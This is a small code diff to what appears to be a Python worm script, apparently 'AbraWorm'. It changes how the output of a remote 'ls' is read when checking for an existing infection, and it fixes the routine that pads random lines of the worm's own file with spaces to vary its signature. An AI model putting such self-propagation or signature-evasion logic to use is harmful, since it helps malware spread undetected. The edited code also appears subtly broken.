@@ -97,7 +97,8 @@ while True:
                     error = stderr.readlines()
                     if error: 
                         print(error)
-                    received_list = stdout.readlines()
+                    
+                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                     print("\n\noutput of 'ls' command: %s" % str(received_list))
                     
                     if ''.join(received_list).find('AbraWorm') >= 0: 
@@ -140,7 +141,6 @@ while True:
                         line1 = random.randint(0, num_lines - 1)
                         rand_size = random.randint(5, 10)
                         line = all_lines[line1]
-                        line.append()
                         random_line_with_spaces = line.strip() + ' ' * rand_size + '\n'
                         all_lines[line1] = random_line_with_spaces
 
